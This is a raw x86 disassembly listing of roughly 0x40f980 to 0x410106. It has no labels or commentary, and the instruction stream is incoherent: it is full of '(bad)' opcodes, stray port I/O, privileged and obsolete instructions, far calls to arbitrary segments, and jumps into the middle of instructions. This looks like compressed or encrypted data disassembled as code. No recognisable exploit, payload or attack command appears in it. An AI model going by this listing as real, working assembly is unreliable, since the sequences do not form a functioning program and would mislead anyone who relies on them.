  40f980:	cmp    DWORD PTR [ebx],esi
  40f982:	and    ah,bl
  40f984:	outs   dx,DWORD PTR ds:[esi]
  40f985:	scas   eax,DWORD PTR es:[edi]
  40f986:	std    
  40f987:	cmp    dl,BYTE PTR [ecx]
  40f989:	cmp    DWORD PTR [edi-0x24],edi
  40f98c:	xchg   edx,eax
  40f98d:	loop   0x40f995
  40f98f:	and    eax,0x595b8985
  40f994:	cmovp  edi,DWORD PTR [edi-0x27ad15c9]
  40f99b:	adc    BYTE PTR [ecx+ecx*8],cl
  40f99e:	(bad)  
  40f99f:	adc    esi,DWORD PTR [ebx-0x2579ebfe]
  40f9a5:	push   ds
  40f9a6:	fwait
  40f9a7:	push   0xffffffed
  40f9a9:	cmp    al,BYTE PTR [edx]
  40f9ab:	jecxz  0x40f9bc
  40f9ad:	xor    ecx,edx
  40f9af:	aaa    
  40f9b0:	jge    0x40fa1e
  40f9b2:	or     al,0xcf
  40f9b4:	adc    DWORD PTR [ecx+esi*1],eax
  40f9b7:	jp     0x40f94e
  40f9b9:	pop    eax
  40f9ba:	pusha  
  40f9bb:	adc    eax,esp
  40f9bd:	push   ds
  40f9be:	loop   0x40f989
  40f9c0:	mov    WORD PTR [ebp+0x30e29184],es
  40f9c6:	outs   dx,DWORD PTR ds:[esi]
  40f9c7:	mov    eax,ds:0x6fdfaadd
  40f9cc:	out    0x79,al
  40f9ce:	bound  ecx,QWORD PTR [ebx]
  40f9d0:	icebp  
  40f9d1:	inc    esp
  40f9d2:	pop    ebx
  40f9d3:	ret    0x5db6
  40f9d6:	xor    al,BYTE PTR [eax]
  40f9d8:	ret    0x9643
  40f9db:	inc    edi
  40f9dc:	pop    esi
  40f9dd:	mov    ah,0x38
  40f9df:	mov    DWORD PTR [edx-0x520f26cd],edx
  40f9e5:	cmp    eax,0x733e998
  40f9ea:	push   esi
  40f9eb:	sbb    bh,BYTE PTR [edx+0x54d0aec1]
  40f9f1:	sub    ch,al
  40f9f3:	and    DWORD PTR [ecx-0x32c60a35],edi
  40f9f9:	mov    dl,0x65
  40f9fb:	ret    0xdcca
  40f9fe:	jns    0x40f9be
  40fa00:	mov    dl,dl
  40fa02:	jp     0x40f9c0
  40fa04:	adc    eax,0x7e4f923
  40fa09:	ins    DWORD PTR es:[edi],dx
  40fa0a:	cmp    eax,0xa7f913e9
  40fa0f:	add    eax,0xebc673d4
  40fa14:	cmc    
  40fa15:	les    ecx,FWORD PTR [edi+edx*2]
  40fa18:	cmp    al,0x4e
  40fa1a:	jle    0x40fa10
  40fa1c:	int3   
  40fa1d:	adc    esp,DWORD PTR [ecx+0x3d3818ed]
  40fa23:	xor    eax,0xcdb8af66
  40fa28:	sub    eax,0xd2024e2e
  40fa2d:	aas    
  40fa2e:	sub    BYTE PTR [ecx+0x3e901874],0x12
  40fa35:	loop   0x40f9cd
  40fa37:	dec    esi
  40fa38:	fld    DWORD PTR [eax+edi*8+0x6361f17e]
  40fa3f:	mov    cl,0x88
  40fa41:	and    al,0xb3
  40fa43:	scas   al,BYTE PTR es:[edi]
  40fa44:	sub    BYTE PTR [edi+edx*2-0x2b204d48],0x1a
  40fa4c:	adc    BYTE PTR [ebx+0x7241a263],ch
  40fa52:	cmp    DWORD PTR [ebx-0x4827213e],ebx
  40fa58:	mov    ebx,esi
  40fa5a:	adc    BYTE PTR [edx+0x73],0x15
  40fa5e:	cmp    BYTE PTR [esi],al
  40fa60:	add    al,BYTE PTR [edx+0x6aa97f2b]
  40fa66:	cmp    BYTE PTR [eax+eax*1+0x62d3635f],0xfa
  40fa6e:	mov    esi,0x8b7ab1d5
  40fa73:	out    dx,al
  40fa74:	out    dx,eax
  40fa75:	mov    edi,0xd9319862
  40fa7a:	mov    WORD PTR [eax-0x1f],es
  40fa7d:	add    ch,BYTE PTR [ebp-0x7e]
  40fa80:	adc    DWORD PTR [esi-0x21],esp
  40fa83:	iret   
  40fa84:	dec    ecx
  40fa85:	sar    DWORD PTR [ecx+0x31],cl
  40fa88:	push   edi
  40fa89:	jne    0x40faa2
  40fa8b:	mov    esp,0xf2c9d800
  40fa90:	fdivr  DWORD PTR [esi]
  40fa92:	lahf   
  40fa93:	shl    edi,0x1b
  40fa96:	pusha  
  40fa97:	xchg   BYTE PTR gs:[eax+0x2cd867ca],dh
  40fa9e:	sub    DWORD PTR [ecx+ebx*8+0x9],edi
  40faa2:	dec    ecx
  40faa3:	shl    DWORD PTR [esi+0x51fbbc58],cl
  40faa9:	or     DWORD PTR [esi-0x5740269a],esi
  40faaf:	jne    0xcb4280f2
  40fab5:	xor    esp,DWORD PTR [eax]
  40fab7:	cmc    
  40fab8:	sub    al,0x90
  40faba:	fadd   DWORD PTR [ecx-0x45]
  40fabd:	adc    DWORD PTR [eax-0x9b73b16],edx
  40fac3:	call   0x68ed:0xfcd050fd
  40faca:	xlat   BYTE PTR ds:[ebx]
  40facb:	ins    DWORD PTR es:[edi],dx
  40facc:	outs   dx,BYTE PTR ds:[esi]
  40facd:	leave  
  40face:	jb     0x40fb22
  40fad0:	cmp    BYTE PTR [esi-0x63],ah
  40fad3:	mov    ds,WORD PTR [esi-0x1a]
  40fad6:	adc    DWORD PTR [ecx-0x5a4c37b4],ecx
  40fadc:	sub    eax,0x8b352218
  40fae1:	test   DWORD PTR [edx],edx
  40fae3:	(bad)  
  40fae4:	nop
  40fae5:	pop    ebx
  40fae6:	out    dx,eax
  40fae7:	cmp    dh,bh
  40fae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faea:	mov    cl,0xfd
  40faec:	xchg   ecx,eax
  40faed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faee:	pop    eax
  40faef:	aam    0x3e
  40faf1:	pop    es
  40faf2:	test   DWORD PTR [eax-0x5c],ebx
  40faf5:	fnsetpm(287 only) 
  40faf7:	xchg   esp,eax
  40faf8:	mov    dh,BYTE PTR [esi+esi*2-0x73]
  40fafc:	loopne 0x40fad1
  40fafe:	mov    eax,0x4451d874
  40fb03:	aaa    
  40fb04:	cs xchg edx,eax
  40fb06:	pop    es
  40fb07:	clc    
  40fb08:	and    ah,BYTE PTR [ebx+eiz*1]
  40fb0b:	imul   ebp,esi,0xffffffdd
  40fb0e:	inc    eax
  40fb0f:	ins    BYTE PTR es:[edi],dx
  40fb10:	ror    DWORD PTR [ebx+0x0],1
  40fb13:	je     0x40fabf
  40fb15:	sbb    edx,ecx
  40fb17:	dec    DWORD PTR [edx]
  40fb19:	cmp    BYTE PTR [esi+0x26fe1137],dl
  40fb1f:	push   0xa5556bfa
  40fb24:	add    ch,al
  40fb26:	and    eax,0xc4988309
  40fb2b:	mov    eax,edi
  40fb2d:	adc    eax,0x365e9a8
  40fb32:	pusha  
  40fb33:	dec    esp
  40fb34:	loop   0x40fb86
  40fb36:	xchg   DWORD PTR [esi-0x7e],ebx
  40fb39:	mov    dh,0x23
  40fb3b:	mov    ah,0x5f
  40fb3d:	xchg   edi,eax
  40fb3e:	mov    ebx,0xe7982e2b
  40fb43:	jb     0x40fb60
  40fb45:	sub    ebx,eax
  40fb47:	test   DWORD PTR [edx],ebx
  40fb49:	sbb    eax,DWORD PTR [esi]
  40fb4b:	mov    dh,0xde
  40fb4d:	jp     0x40fbb8
  40fb4f:	mov    ds:0x68f9838d,eax
  40fb54:	or     ebx,eax
  40fb56:	dec    edi
  40fb57:	dec    edi
  40fb58:	mov    bl,0xf1
  40fb5a:	jg     0x40fb75
  40fb5c:	arpl   WORD PTR [ecx+0x3d],sp
  40fb5f:	call   0x39387d27
  40fb64:	push   edi
  40fb65:	adc    edx,DWORD PTR [edi-0x6b]
  40fb68:	out    dx,eax
  40fb69:	dec    ecx
  40fb6a:	cs into 
  40fb6c:	jecxz  0x40fb4e
  40fb6e:	(bad)  
  40fb6f:	sub    DWORD PTR [ebx+0x23],edx
  40fb72:	(bad)  
  40fb73:	aad    0x3c
  40fb75:	test   BYTE PTR [esi-0x598a6eb4],ah
  40fb7b:	adc    BYTE PTR [ebx-0x4c64330a],0xb7
  40fb82:	dec    DWORD PTR [edi]
  40fb84:	ret    0x449b
  40fb87:	ins    DWORD PTR es:[edi],dx
  40fb88:	cli    
  40fb89:	cld    
  40fb8a:	and    BYTE PTR [edi-0x50],cl
  40fb8d:	push   esi
  40fb8e:	sub    BYTE PTR [ebx],al
  40fb90:	dec    edi
  40fb91:	adc    eax,0xdc4a6c17
  40fb96:	mov    eax,0xe12afd95
  40fb9b:	dec    edx
  40fb9c:	lahf   
  40fb9d:	jecxz  0x40fb50
  40fb9f:	cmp    eax,DWORD PTR [ebx]
  40fba1:	inc    ecx
  40fba2:	xchg   esi,eax
  40fba3:	sbb    BYTE PTR [ebx-0x74],0x70
  40fba7:	dec    esi
  40fba8:	mov    al,ds:0xe21f1bda
  40fbad:	and    al,0x95
  40fbaf:	aaa    
  40fbb0:	mov    ds:0x55ce1936,al
  40fbb5:	mov    ds,WORD PTR [eax-0x1dcd0910]
  40fbbb:	add    BYTE PTR ds:0x7ad677f3,cl
  40fbc1:	cmp    esp,ecx
  40fbc3:	fnstenv [edi+0x23]
  40fbc6:	pop    esp
  40fbc7:	sbb    ecx,DWORD PTR [ebx-0x36b2bf96]
  40fbcd:	mov    dh,0xf7
  40fbcf:	sbb    eax,0xde0c24cb
  40fbd4:	loop   0x40fbcc
  40fbd6:	cmp    al,0x63
  40fbd8:	ffreep st(0)
  40fbda:	in     eax,dx
  40fbdb:	add    eax,0xe0aeaa65
  40fbe0:	aam    0xa5
  40fbe2:	pop    ss
  40fbe3:	pop    es
  40fbe4:	pop    ebx
  40fbe5:	mov    edi,0x195087c1
  40fbea:	xor    edx,DWORD PTR [ecx-0x25fa7931]
  40fbf0:	xchg   ebx,eax
  40fbf2:	cmp    BYTE PTR [edx-0x7a],0xc6
  40fbf6:	gs dec esp
  40fbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf9:	mov    esp,0x8430de02
  40fbfe:	adc    cl,BYTE PTR [edx+0x4a]
  40fc01:	pop    esi
  40fc02:	shl    BYTE PTR [esi],0x1b
  40fc05:	int3   
  40fc06:	cli    
  40fc07:	call   FWORD PTR [ebx]
  40fc09:	and    eax,0xf4609261
  40fc0e:	push   ecx
  40fc0f:	and    eax,0x92bc659
  40fc14:	mov    ah,0x28
  40fc16:	xor    eax,ebp
  40fc18:	dec    ebx
  40fc19:	es mov ebx,0xe5867a58
  40fc1f:	sbb    al,0x7a
  40fc21:	and    cl,ah
  40fc23:	mov    dl,0xd1
  40fc25:	cdq    
  40fc26:	adc    dh,BYTE PTR [eax+ebx*1]
  40fc29:	push   ebx
  40fc2a:	pop    ebx
  40fc2b:	xchg   esp,eax
  40fc2c:	dec    ecx
  40fc2d:	pop    esi
  40fc2e:	popf   
  40fc2f:	(bad)  ds:[ecx-0x61695d83]
  40fc37:	sub    BYTE PTR [edi+0x5e],dh
  40fc3a:	push   esi
  40fc3b:	and    edi,esi
  40fc3d:	fs ins BYTE PTR es:[edi],dx
  40fc3f:	pop    esi
  40fc40:	scas   al,BYTE PTR es:[edi]
  40fc41:	fcmovu st,st(5)
  40fc43:	pop    ecx
  40fc44:	fwait
  40fc45:	sbb    BYTE PTR [ecx],bl
  40fc47:	aaa    
  40fc48:	sbb    bl,dl
  40fc4a:	jecxz  0x40fccb
  40fc4c:	lods   al,BYTE PTR ds:[esi]
  40fc4d:	xchg   edi,esi
  40fc4f:	dec    ebx
  40fc50:	xchg   BYTE PTR [edi+0x3aedbde1],bl
  40fc56:	sbb    eax,0x8b7219a2
  40fc5b:	out    dx,eax
  40fc5c:	add    dl,BYTE PTR [ecx+0x2222b16f]
  40fc62:	and    BYTE PTR [edi+eax*1],bl
  40fc65:	jl     0x40fc4d
  40fc67:	popa   
  40fc68:	ficom  WORD PTR [edi]
  40fc6a:	xlat   BYTE PTR ds:[ebx]
  40fc6b:	in     eax,dx
  40fc6c:	cmp    DWORD PTR [ebp+0xd],eax
  40fc6f:	cli    
  40fc70:	cdq    
  40fc71:	imul   ebx,DWORD PTR [edx],0x9b90bebc
  40fc77:	adc    DWORD PTR [edi+0x3dff01ed],edx
  40fc7d:	xchg   esi,eax
  40fc7e:	mov    edi,0xd572a91f
  40fc83:	push   cs
  40fc84:	sar    BYTE PTR [esi],cl
  40fc86:	lahf   
  40fc87:	cmp    al,0xfa
  40fc89:	or     esi,esi
  40fc8b:	xchg   esi,eax
  40fc8c:	test   DWORD PTR [esi+edx*4+0x1ecd64d7],esp
  40fc93:	cmp    bl,BYTE PTR [edi+edi*2+0x34699795]
  40fc9a:	inc    eax
  40fc9b:	mov    eax,0xaafbcc55
  40fca0:	rol    DWORD PTR [eax-0x7f],0x92
  40fca4:	lds    ebx,FWORD PTR [ebp-0x74]
  40fca7:	fstp   TBYTE PTR cs:[ecx]
  40fcaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcab:	icebp  
  40fcac:	je     0x40fc8f
  40fcae:	test   eax,0x37389bfc
  40fcb3:	mov    al,0xbe
  40fcb5:	jae    0x40fcbb
  40fcb7:	push   es
  40fcb8:	push   esp
  40fcb9:	dec    edx
  40fcba:	scas   al,BYTE PTR es:[edi]
  40fcbb:	jmp    0x53c4b16
  40fcc0:	inc    ebx
  40fcc1:	sahf   
  40fcc2:	adc    BYTE PTR [edi],bh
  40fcc4:	fsub   st,st(5)
  40fcc6:	dec    ebp
  40fcc7:	enter  0x4e8b,0xfd
  40fccb:	inc    esi
  40fccc:	mov    al,0x47
  40fcce:	call   DWORD PTR [edi-0x6a148367]
  40fcd4:	scas   eax,DWORD PTR es:[edi]
  40fcd5:	ins    BYTE PTR es:[edi],dx
  40fcd6:	fwait
  40fcd7:	or     dh,al
  40fcd9:	sahf   
  40fcda:	repnz cmp DWORD PTR [ecx],eax
  40fcdd:	fisub  WORD PTR [eax+0x7f]
  40fce0:	push   es
  40fce1:	sbb    BYTE PTR [edx+0x20],bl
  40fce4:	jle    0x40fc81
  40fce6:	xlat   BYTE PTR ds:[ebx]
  40fce7:	call   0xe298:0x994032dc
  40fcee:	psrld  mm4,QWORD PTR [edi+0xc]
  40fcf2:	inc    eax
  40fcf3:	mov    bh,BYTE PTR [esi-0x3fa12dbf]
  40fcf9:	sahf   
  40fcfa:	mov    ds:0x9b0bb690,al
  40fcff:	dec    DWORD PTR [edi]
  40fd01:	jmp    0x40fd57
  40fd03:	sub    al,BYTE PTR [esi]
  40fd05:	push   es
  40fd06:	jg     0x40fd37
  40fd08:	or     eax,0x2906041e
  40fd0d:	mov    ebp,0x7a638a71
  40fd12:	push   esi
  40fd13:	mov    es:0x1c81377a,al
  40fd19:	das    
  40fd1a:	cs enter 0x476d,0x91
  40fd1f:	xor    DWORD PTR [ebx-0x3c],0x3bc61c8
  40fd26:	lods   eax,DWORD PTR ds:[esi]
  40fd27:	inc    esi
  40fd28:	jno    0x40fcbb
  40fd2a:	adc    DWORD PTR [ebp-0x4550b537],ebp
  40fd30:	mov    WORD PTR [ecx-0x12e8aa2f],fs
  40fd36:	or     BYTE PTR [ebx],0x81
  40fd39:	pop    es
  40fd3a:	sbb    ch,al
  40fd3c:	cdq    
  40fd3d:	inc    esp
  40fd3e:	call   0x4aa3c702
  40fd43:	retf   
  40fd44:	int    0x84
  40fd46:	repz imul dh
  40fd49:	icebp  
  40fd4a:	test   eax,0x3e1bb5e7
  40fd4f:	xchg   BYTE PTR [esi-0x5cdb],bh
  40fd55:	out    dx,al
  40fd56:	(bad)  
  40fd57:	mov    ah,0x32
  40fd59:	pusha  
  40fd5a:	push   ss
  40fd5b:	or     eax,DWORD PTR [eax+0x35]
  40fd5e:	in     eax,dx
  40fd5f:	and    eax,0x286e7a14
  40fd64:	sbb    eax,0x64362fc6
  40fd69:	inc    esp
  40fd6a:	adc    DWORD PTR [ebp+0x3a1c73d],0xee248396
  40fd74:	jp     0x40fd90
  40fd76:	add    BYTE PTR [esi-0x757e0a5e],ch
  40fd7c:	xor    DWORD PTR [ebx-0x2a],ebp
  40fd7f:	xchg   ebx,eax
  40fd80:	add    eax,0x5f0b1498
  40fd85:	aas    
  40fd86:	xchg   edi,eax
  40fd87:	jg     0x40fd7c
  40fd89:	ds dec ebx
  40fd8b:	sar    BYTE PTR [esi+0x16e053c9],cl
  40fd91:	mov    al,ds:0xfb377e40
  40fd96:	push   ecx
  40fd97:	xchg   ebp,eax
  40fd98:	sbb    BYTE PTR [esi+0x1b],ch
  40fd9b:	xchg   ebx,eax
  40fd9c:	xlat   BYTE PTR ds:[ebx]
  40fd9d:	push   ebx
  40fd9e:	pop    ds
  40fd9f:	(bad)  
  40fda0:	clc    
  40fda1:	and    al,0x17
  40fda3:	dec    esp
  40fda4:	push   ebx
  40fda5:	xor    DWORD PTR [ecx],esi
  40fda7:	fistp  QWORD PTR [edi+0x1c]
  40fdaa:	call   0x8931:0xf2dbc8ae
  40fdb1:	rcr    BYTE PTR [eax-0xa],1
  40fdb4:	jmp    FWORD PTR [ebp+0x41]
  40fdb7:	inc    ecx
  40fdb8:	fmul   DWORD PTR [esi+eax*1]
  40fdbb:	pop    ds
  40fdbc:	sbb    ebx,esp
  40fdbe:	jo     0x40fd8e
  40fdc0:	mov    ebx,0x7fbf3af7
  40fdc5:	push   ebx
  40fdc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdc7:	mov    ah,0x7c
  40fdc9:	and    dl,al
  40fdcb:	rol    DWORD PTR [ecx],cl
  40fdcd:	add    BYTE PTR [edi],0xb6
  40fdd0:	dec    esi
  40fdd1:	loop   0x40fe44
  40fdd3:	push   ebp
  40fdd4:	fcom   st(5)
  40fdd6:	and    BYTE PTR [eax+0x6d02300],dh
  40fddc:	sbb    BYTE PTR [ebx-0xdd2be63],0xa0
  40fde3:	pop    ebx
  40fde4:	fisttp QWORD PTR [esi+edx*1+0x3b]
  40fde8:	adc    ecx,edi
  40fdea:	call   0xf41743e9
  40fdef:	mov    bl,BYTE PTR [edx+0x7084e164]
  40fdf5:	push   eax
  40fdf6:	xchg   esp,ebx
  40fdf8:	push   edi
  40fdf9:	mov    eax,0x52827967
  40fdfe:	jo     0x40fe6a
  40fe00:	fist   WORD PTR [edi-0x309d006e]
  40fe06:	inc    ecx
  40fe07:	mov    al,ds:0x5a6b73d6
  40fe0c:	retf   
  40fe0d:	mov    edx,esp
  40fe0f:	xchg   ebp,eax
  40fe10:	or     BYTE PTR ds:0x910098a5,al
  40fe16:	or     WORD PTR [edi+0x236dbd63],bx
  40fe1d:	push   esp
  40fe1e:	add    al,0x8a
  40fe20:	daa    
  40fe21:	aaa    
  40fe22:	scas   eax,DWORD PTR es:[edi]
  40fe23:	add    esi,DWORD PTR [esi]
  40fe25:	sub    BYTE PTR ss:[ecx-0x39],dh
  40fe29:	adc    cl,BYTE PTR [ebx-0xa5d758c]
  40fe2f:	jmp    0xd28e:0x9b87eb80
  40fe36:	jge    0x40fea6
  40fe38:	push   ebp
  40fe39:	fidivr DWORD PTR [esi]
  40fe3b:	inc    ebx
  40fe3c:	push   edx
  40fe3d:	push   eax
  40fe3e:	jno    0x40fe7a
  40fe40:	ss icebp 
  40fe42:	push   edi
  40fe43:	daa    
  40fe44:	mov    al,0xad
  40fe46:	scas   eax,DWORD PTR es:[edi]
  40fe47:	xchg   ecx,eax
  40fe48:	in     al,dx
  40fe49:	mov    ebx,0xf3d9425e
  40fe4e:	bound  esi,QWORD PTR ds:0x823206ce
  40fe54:	ins    BYTE PTR es:[edi],dx
  40fe55:	push   ecx
  40fe56:	push   ecx
  40fe57:	jns    0x40fe1a
  40fe59:	test   edi,edi
  40fe5b:	sub    eax,0x7de9a7f1
  40fe60:	test   DWORD PTR [eax+esi*8-0x53],edx
  40fe64:	ja     0x40fe5e
  40fe66:	ror    esp,cl
  40fe68:	xor    DWORD PTR [eax],edx
  40fe6a:	lahf   
  40fe6b:	leave  
  40fe6c:	sbb    eax,0xee2cebfc
  40fe71:	int3   
  40fe72:	adc    BYTE PTR ds:0x72dc8427,bl
  40fe78:	data16 scas al,BYTE PTR es:[edi]
  40fe7a:	xchg   ebp,eax
  40fe7b:	pop    eax
  40fe7c:	push   0xffffffc8
  40fe7e:	mov    ecx,DWORD PTR [edi+0x290d479a]
  40fe84:	enter  0xc299,0x0
  40fe88:	enter  0xee77,0xd6
  40fe8c:	es add ecx,ebx
  40fe8f:	in     eax,dx
  40fe90:	shl    BYTE PTR [edx],0x6e
  40fe93:	jnp    0x40fe43
  40fe95:	cli    
  40fe96:	das    
  40fe97:	mov    ebx,0xce7a901e
  40fe9c:	or     al,0x65
  40fe9e:	aaa    
  40fe9f:	inc    edi
  40fea0:	pop    ecx
  40fea1:	xchg   edi,eax
  40fea2:	in     al,0xb3
  40fea4:	dec    eax
  40fea5:	outs   dx,BYTE PTR ds:[si]
  40fea7:	or     eax,0x799cf999
  40feac:	(bad)  
  40fead:	mov    BYTE PTR [ebx-0x26a1aeb1],dl
  40feb3:	sbb    eax,0x5419c77b
  40feb8:	cmp    DWORD PTR [eax],ebx
  40feba:	scas   al,BYTE PTR es:[edi]
  40febb:	shl    BYTE PTR gs:[ecx],cl
  40febe:	adc    al,0x52
  40fec0:	std    
  40fec1:	mov    al,BYTE PTR [ecx]
  40fec3:	push   0x32
  40fec5:	xor    BYTE PTR ds:0x1d4e71f5,dh
  40fecb:	imul   ecx,DWORD PTR [edx+0x3b],0x2d3a55f
  40fed2:	push   es
  40fed3:	jle    0x40fe94
  40fed5:	mov    edi,0xbd9368e5
  40feda:	jl     0x40ff0e
  40fedc:	enter  0x4c6e,0xe8
  40fee0:	hlt    
  40fee1:	rcr    BYTE PTR [ecx+0x62],0x69
  40fee5:	pop    edi
  40fee6:	rcl    DWORD PTR [ecx+ebp*8-0x33ff4399],cl
  40feed:	mov    al,0xa9
  40feef:	sti    
  40fef0:	mov    dh,0xeb
  40fef2:	aas    
  40fef3:	dec    ebp
  40fef4:	xchg   ecx,eax
  40fef5:	fs and ebp,esi
  40fef8:	mov    bh,0xeb
  40fefa:	jnp    0x40ff53
  40fefc:	cmp    DWORD PTR [ecx],edi
  40fefe:	dec    esi
  40feff:	push   ss
  40ff00:	mov    dh,0xda
  40ff02:	imul   edi,DWORD PTR ds:0x3495df27,0x4c
  40ff09:	sbb    DWORD PTR [edi+edi*2],ecx
  40ff0c:	dec    ecx
  40ff0d:	lods   eax,DWORD PTR ds:[esi]
  40ff0e:	dec    edi
  40ff0f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40ff11:	adc    eax,0xa75b0f11
  40ff16:	and    al,0x3d
  40ff18:	fidiv  DWORD PTR [edi]
  40ff1a:	call   0xc76f:0xc1fc4900
  40ff21:	jo     0x40ff65
  40ff23:	lods   al,BYTE PTR ds:[esi]
  40ff24:	cs push eax
  40ff26:	js     0x40febd
  40ff28:	push   0xffffffeb
  40ff2a:	push   DWORD PTR [edi]
  40ff2c:	mov    DWORD PTR [ebx-0x2d],0xacc386f0
  40ff33:	and    esi,ebx
  40ff35:	dec    edx
  40ff36:	loopne 0x40ff5e
  40ff38:	cld    
  40ff39:	and    dh,dh
  40ff3b:	push   esp
  40ff3c:	inc    ecx
  40ff3d:	fdivp  st(2),st
  40ff3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff40:	push   edi
  40ff41:	add    bh,BYTE PTR [eax+0x469c5fcc]
  40ff47:	push   es
  40ff48:	mov    dl,BYTE PTR [eax]
  40ff4a:	test   BYTE PTR [eax-0x3144c983],bl
  40ff50:	test   DWORD PTR [edx-0x4626dcf3],edx
  40ff56:	pusha  
  40ff57:	inc    ecx
  40ff58:	xor    BYTE PTR [eax+eiz*2+0x26b6ee89],dh
  40ff5f:	jp     0x40ff9c
  40ff61:	int    0x88
  40ff63:	sar    bh,0x87
  40ff66:	(bad)  
  40ff67:	cli    
  40ff68:	xchg   edi,eax
  40ff69:	outs   dx,BYTE PTR ds:[esi]
  40ff6a:	bnd js 0x40ff56
  40ff6d:	xor    BYTE PTR [esi+0x4a],ch
  40ff70:	and    ah,0xf6
  40ff73:	jb     0x40ffb7
  40ff75:	jle    0x40ffe1
  40ff77:	jmp    0x64df:0x52dec128
  40ff7e:	stos   DWORD PTR es:[edi],eax
  40ff7f:	sbb    ebp,DWORD PTR [ecx]
  40ff81:	push   edx
  40ff82:	sbb    DWORD PTR ds:0xd2d12866,edi
  40ff88:	mov    ah,BYTE PTR [ecx-0x769009c3]
  40ff8e:	cdq    
  40ff8f:	and    DWORD PTR [esi-0x3b],eax
  40ff92:	cmp    BYTE PTR [ebp+0x49],ch
  40ff95:	aas    
  40ff96:	and    al,0x7e
  40ff98:	xchg   ebx,eax
  40ff99:	ret    
  40ff9a:	int    0x63
  40ff9c:	scas   eax,DWORD PTR es:[edi]
  40ff9d:	sbb    BYTE PTR [ebx-0x1f12fb45],ch
  40ffa3:	ret    0xce68
  40ffa6:	sbb    DWORD PTR [edx],ebp
  40ffa8:	fwait
  40ffa9:	push   eax
  40ffaa:	mov    edi,ss
  40ffac:	adc    esi,eax
  40ffae:	sub    al,0xe
  40ffb0:	xor    BYTE PTR [ebx],dh
  40ffb2:	fnsave ds:0x4a28f4e2
  40ffb8:	inc    edi
  40ffb9:	sub    eax,0x73e12475
  40ffbe:	jnp    0x41002d
  40ffc0:	or     al,BYTE PTR [ecx-0x65a85afa]
  40ffc6:	mov    ah,0xfc
  40ffc8:	and    ah,dh
  40ffca:	adc    edi,DWORD PTR [eax+edi*2-0x4499aa3f]
  40ffd1:	loop   0x40ff96
  40ffd3:	cdq    
  40ffd4:	shl    DWORD PTR [ecx+0xb],cl
  40ffd7:	sub    ah,bl
  40ffd9:	jecxz  0x410054
  40ffdb:	add    BYTE PTR [ebp+edx*2+0x3f],0xc3
  40ffe0:	mov    cl,0xf7
  40ffe2:	ss dec eax
  40ffe4:	fmul   st,st(1)
  40ffe6:	out    dx,al
  40ffe7:	out    0xe9,eax
  40ffe9:	xchg   esp,eax
  40ffea:	push   DWORD PTR [ecx-0x54]
  40ffed:	adc    al,0x3d
  40ffef:	shl    DWORD PTR [ecx+0x4bdc22dd],1
  40fff5:	adc    eax,0x19a933
  40fffa:	sbb    al,0xd6
  40fffc:	and    al,0xe6
  40fffe:	stos   DWORD PTR es:[edi],eax
  40ffff:	aas    
  410000:	test   eax,0x7384be36
  410005:	xor    al,0x98
  410007:	(bad)  
  41000a:	aad    0xdc
  41000c:	inc    edx
  41000d:	xchg   edx,eax
  41000e:	add    BYTE PTR [edi],ah
  410010:	cmp    eax,0xb0d0a199
  410015:	in     eax,dx
  410016:	mov    ecx,0x5f0a8a74
  41001b:	mov    ebp,DWORD PTR [ecx]
  41001d:	dec    edi
  41001e:	add    BYTE PTR [eax],0xc
  410021:	fnsetpm(287 only) 
  410023:	retf   
  410024:	sub    ebx,DWORD PTR [eax+esi*1+0x77]
  410028:	inc    ecx
  410029:	xchg   ecx,eax
  41002a:	(bad)  
  41002b:	adc    al,0x86
  41002d:	add    dh,BYTE PTR [edx+0x5d]
  410030:	loopne 0x410099
  410032:	inc    esp
  410033:	hlt    
  410034:	and    dl,BYTE PTR [eax-0x4160619]
  41003a:	xchg   ebx,eax
  41003b:	shr    DWORD PTR [ebp-0x6d3ab0c7],cl
  410041:	popa   
  410042:	xchg   esp,eax
  410043:	push   ss
  410044:	xchg   BYTE PTR [edx-0x4458ef83],dl
  41004a:	leave  
  41004b:	lods   eax,DWORD PTR ds:[esi]
  41004c:	leave  
  41004d:	push   0x2f487358
  410052:	add    al,0xa1
  410054:	xchg   ecx,eax
  410055:	pop    edx
  410056:	stc    
  410057:	test   al,0x58
  410059:	mov    DWORD PTR [ebp-0x1c42fdb7],ebp
  41005f:	pushf  
  410060:	cdq    
  410061:	cmc    
  410062:	and    al,0xb9
  410064:	(bad)
  410067:	js     0x410014
  410069:	mov    edx,0xb746bb3a
  41006e:	cdq    
  41006f:	inc    eax
  410070:	mov    gs,ebp
  410072:	(bad)  
  410073:	sub    eax,0xe2254eef
  410078:	add    eax,0x1cdad56
  41007d:	cmp    BYTE PTR [edx-0x495fe044],dl
  410083:	and    DWORD PTR [ecx+0x5d],ebp
  410086:	mov    al,0x91
  410088:	jno    0x410055
  41008a:	pop    eax
  41008b:	inc    edx
  41008c:	retf   
  41008d:	aad    0xbe
  41008f:	mov    eax,0xdb6e3998
  410094:	inc    ebp
  410095:	mov    BYTE PTR [ebp-0x3a5228ed],ch
  41009b:	cli    
  41009c:	mov    al,ds:0xce45d1ac
  4100a1:	jb     0x410091
  4100a3:	push   ecx
  4100a4:	mov    ds,WORD PTR [ebp-0x5812a7e2]
  4100aa:	sub    ch,BYTE PTR [edi+0x73]
  4100ad:	sub    eax,0x317b3634
  4100b2:	add    eax,0x985570a5
  4100b7:	fsub   DWORD PTR [eax+0x72310a52]
  4100bd:	or     ebp,ebp
  4100bf:	mov    ebx,0x347d6625
  4100c4:	shl    DWORD PTR [ecx+0x6d1556c3],0x50
  4100cb:	mov    dh,ah
  4100cd:	cld    
  4100ce:	call   0xb2c3:0xd071d4c9
  4100d5:	jmp    0x1293:0xf209f99b
  4100dc:	imul   ebp,DWORD PTR [ebp-0x51],0x8e1e3652
  4100e3:	push   esi
  4100e4:	fwait
  4100e5:	inc    esi
  4100e6:	sub    ecx,eax
  4100e8:	test   eax,0x27a5a02d
  4100ed:	loope  0x410127
  4100ef:	jg     0x41007e
  4100f1:	cmp    esi,DWORD PTR [edi]
  4100f3:	data16 addr16 cs cld 
  4100f7:	fdivr  DWORD PTR [ebp+0x39e00d3f]
  4100fd:	jmp    0x4100b1
  4100ff:	xchg   BYTE PTR [eax+0x110d06b2],ch
  410105:	leave  
  410106:	push   edi
